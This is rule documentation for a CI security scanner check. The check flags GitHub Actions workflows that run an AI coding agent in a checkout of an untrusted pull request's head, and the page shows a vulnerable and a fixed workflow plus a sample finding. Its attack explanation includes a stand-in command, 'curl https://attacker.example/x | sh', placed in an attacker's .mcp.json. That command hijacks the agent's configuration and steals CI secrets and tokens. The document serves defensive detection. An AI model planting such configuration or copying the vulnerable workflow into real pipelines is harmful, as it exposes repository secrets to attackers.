# HK-WF-002: AI agent step runs in a checkout of the PR head on an untrusted trigger

| Check | Runs in | Default severity |
|---|---|---|
| `workflows` | `heldkeys ci` | High |

## What it detects

On an untrusted trigger (`pull_request_target`, `issue_comment`, `workflow_run` and the others listed in [HK-WF-001](HK-WF-001.md)), a step that checks out the pull request's own code, followed later in the same job by an agent step. heldkeys recognises:

- `actions/checkout` with `ref:` or `repository:` set to `github.event.pull_request.head.sha`, `.head.ref`, `github.head_ref`, `refs/pull/...`, `github.event.workflow_run.head_sha` or similar;
- `run:` steps with `gh pr checkout`, `git fetch ... pull/...` or a `git checkout` of the head ref (comments and heredoc bodies in the script are ignored).

The finding names the command that matched (`gh pr checkout`, `git fetch ... pull/<n>/head`, or the head-ref expression given to `actions/checkout`), never the text of the step, since a `run:` line can carry a token in a URL. In a local reusable workflow, the checkout and the agent step are looked for in the called workflow's job, on the caller's triggers.

## Why it matters for agents

Coding agents configure themselves from the repository they start in. Claude Code reads `CLAUDE.md`, `.claude/settings.json` (which can define hooks, commands that run automatically) and `.mcp.json` (which starts MCP servers, which are programs). Codex and others read `AGENTS.md`; Cursor reads `.cursor/`. When the working tree is the attacker's PR, all of that is attacker-controlled. This is the pattern behind CVE-2026-47751: the agent loads configuration from the PR head and runs it with the base repository's secrets.

The attack needs no prompt-injection finesse. A fork PR adds a `.mcp.json` whose server command is `curl https://attacker.example/x | sh`, and a comment asks the bot to review it. The workflow checks out the PR head so the agent can "see the change", the agent starts, the MCP server starts with it, and the script reads the job's environment and the token `actions/checkout` left in `.git/config`.

## Known limitation

heldkeys only sees checkouts the workflow file spells out. Some agent actions fetch or check out the pull request themselves: claude-code-action, for example, may switch to the PR branch on its own when it runs on a comment on a pull request (`issue_comment`, `pull_request_review_comment`). heldkeys does not model what an action does internally, so such a job gets [HK-WF-001](HK-WF-001.md) but not HK-WF-002. Treat any agent that works on a pull request from a comment event as running in the PR's files unless the action's documentation says otherwise.

## Vulnerable

```yaml
on: pull_request_target

permissions:
  contents: read
  pull-requests: write

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha> # v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: anthropics/claude-code-action@<sha> # v1
        with:
          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
```

## Fixed

Run the agent in a checkout of the base branch (the default for `pull_request_target`) and give it the PR as data: the diff from the API, not the files as its working tree. If it must build or test the PR's code, do that in a `pull_request` workflow, which has no secrets on forks.

```yaml
on: pull_request_target

permissions:
  contents: read
  pull-requests: write

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha> # v4 (base branch: trusted config)
        with:
          persist-credentials: false
      - uses: anthropics/claude-code-action@<sha> # v1
        with:
          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
          prompt: Review the diff of PR ${{ github.event.pull_request.number }} using gh pr diff.
```

This removes HK-WF-002. The job still runs an agent on attacker-written text with `pull-requests: write`, so [HK-WF-001](HK-WF-001.md) still applies; drop that permission if the agent only needs to comment through a separate job.

## Example

One finding as `heldkeys ci --format json` reports it:

```json
{
  "check": "workflows",
  "rule": "HK-WF-002",
  "title": "AI agent runs in a checkout of the PR head",
  "location": ".github/workflows/review.yml:14 jobs.review.steps[1] (uses: anthropics/claude-code-action@0123456)",
  "fingerprint": null,
  "severity": "high",
  "lifetime": "short-lived",
  "access": "write",
  "detail": "actions/checkout with ref: ${{ github.event.pull_request.head.sha }} on pull_request_target; the agent then loads attacker-controlled .mcp.json, CLAUDE.md, AGENTS.md, .claude/ or .cursor/ from the PR (the CVE-2026-47751 pattern)",
  "fix": "Check out the base branch for the agent (default ref); give it the PR diff as data, never the PR's files as its working tree.",
  "category": "workflow"
}
```

## References

- [CVE-2026-47751](https://www.cve.org/CVERecord?id=CVE-2026-47751)
- [GitHub Security Lab: preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [Claude Code: settings and hooks](https://docs.anthropic.com/en/docs/claude-code/settings)
- [Model Context Protocol: project-scoped servers in .mcp.json](https://docs.anthropic.com/en/docs/claude-code/mcp)
- [zizmor: dangerous-triggers audit](https://docs.zizmor.sh/audits/#dangerous-triggers)
